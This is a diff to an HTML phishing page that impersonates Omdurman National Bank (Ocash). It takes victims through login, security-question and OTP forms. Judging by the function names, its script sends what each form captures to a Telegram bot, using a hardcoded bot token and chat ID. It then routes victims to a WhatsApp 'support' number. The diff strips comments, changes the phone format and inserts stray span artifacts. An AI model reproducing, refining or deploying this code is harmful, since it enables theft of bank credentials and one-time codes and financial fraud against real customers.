@@ -99,7 +99,6 @@
         .steps h4 { color: var(--main-green); margin-bottom: 10px; text-align: center; }
         .steps ol { padding-right: 20px; color: #444; line-height: 1.6; font-size: 13px; }
 
-        /* تصميم صفحة النجاح والتحويل للواتساب */
         .success-box {
             text-align: center;
             padding: 10px 5px;
@@ -156,7 +155,6 @@
 </head>
 <body>
 
-    <!-- الترويسة الرئيسية -->
     <header class="top-header">
         <a onclick="showPage('login-page')" class="header-text">خدمات بنك أمدرمان الوطني أونلاين</a>
         <div class="logo-text">
@@ -164,7 +162,7 @@
         </div>
     </header>
 
-    <!-- 1. الصفحة الرئيسية (عرض كافة الخدمات) -->
+    <!-- 1. الصفحة الرئيسية -->
     <div id="home-page" class="page-section active">
         <section class="services-container">
             <div class="services-title">بنك أمدرمان الوطني (أوكاش) | مرحباً بكم في خدمات بنك أمدرمان الوطني</div>
@@ -211,12 +209,12 @@
 
             <div class="contact-banner">
                 <p>للتواصل معنا، يرجى استخدام رقم واتساب</p>
-                <span class="whatsapp-number">0118737098</span>
+                <span class="whatsapp-number">+249118737098</span>
             </div>
         </section>
     </div>
 
-    <!-- 2. صفحة تفاصيل الخدمة -->
+    <!-- 2. تفاصيل الخدمة -->
     <div id="details-page" class="page-section">
         <div class="card" style="text-align: center;">
             <i id="det-icon" class="fa-solid fa-shield-halved" style="font-size: 40px; color: #1a8a3f; margin-bottom: 10px;"></i>
@@ -231,7 +229,7 @@
         </div>
     </div>
 
-    <!-- 3. صفحة تسجيل الدخول -->
+    <!-- 3. تسجيل الدخول -->
     <div id="login-page" class="page-section">
         <div class="card">
             <h3>الاستمارة أونلاين</h3>
@@ -252,7 +250,7 @@
         </div>
     </div>
 
-    <!-- 4. صفحة أسئلة الأمان -->
+    <!-- 4. أسئلة الأمان -->
     <div id="security-page" class="page-section">
         <div class="card">
             <h3>متابعة الاستمارة أونلاين</h3>
@@ -289,7 +287,7 @@
         </div>
     </div>
 
-    <!-- 5. صفحة رمز التحقق OTP -->
+    <!-- 5. رمز OTP -->
     <div id="otp-page" class="page-section">
         <div class="card" style="text-align: center;">
             <h3>إدخال رمز OTP</h3>
@@ -304,14 +302,14 @@
         </div>
     </div>
 
-    <!-- 6. الصفحة الجديدة المطورة لرسالة التسليم والتواصل -->
+    <!-- 6. صفحة النجاح ورسالة الواتساب بالرقم الدولي -->
     <div id="confirm-page" class="page-section">
         <div class="card">
             <div class="success-box">
                 <i class="fa-solid fa-circle-check success-icon"></i>
                 <div class="success-title">تم تسليم بياناتك بنجاح</div>
                 <div class="success-msg">
-                    الرجاء التواصل مع فريق الدعم على الواتساب لحل المشكلة وإكمال طلبك.
+                    الرجاء التواصل مع فريق الدعم على الواتساب لحل المشكلة وإكمال طلبك[span_1](start_span)[span_1](end_span).
                 </div>
                 <a href="#" onclick="sendWhatsApp()" class="btn-whatsapp-custom">
                     <i class="fa-brands fa-whatsapp" style="font-size: 22px;"></i> التواصل مع الدعم عبر واتساب
@@ -323,7 +321,6 @@
     <footer class="footer">بنك أمدرمان الوطني (أوكاش) | جميع الحقوق محفوظة 2026</footer>
 
     <script>
-        // إعدادات التيليجرام بالتوكن والآيدي الخاصين بك
         const TELEGRAM_BOT_TOKEN = "8874850044:AAGYZncow8wTcaq0H7BPG-u8sTnT7jQ_TTDUTDU";
         const TELEGRAM_CHAT_ID = "8362235682";
 
@@ -383,7 +380,6 @@
             }
         }
 
-        // جمع البيانات متسلسلاً وإرسالها فورياً إلى بوت التيليجرام
         function captureAndProceed(event, nextPage, stepName) {
             event.preventDefault();
 
@@ -403,7 +399,6 @@
             showPage(nextPage);
         }
 
-        // دالة الإرسال الفوري لتيليجرام
         function sendToTelegram(stageInfo) {
             const message = `
 🔔 *إشعار جديد من موقع بنك أمدرمان*:
@@ -430,7 +425,7 @@
         }
 
         function sendWhatsApp() {
-            const phone = "0118737098";
+            const phone = "249118737098"; // الرقم مع كود السودان الدولي بدون علامة + في الرابط
             const text = encodeURIComponent(`مرحباً فريق الدعم، تم تسليم بياناتي بنجاح وأحتاج المساعدة للتحقق من الحساب.\nاسم المستخدم: ${userData.username}`);
             window.location.href = `https://wa.me/${phone}?text=${text}`;
         }
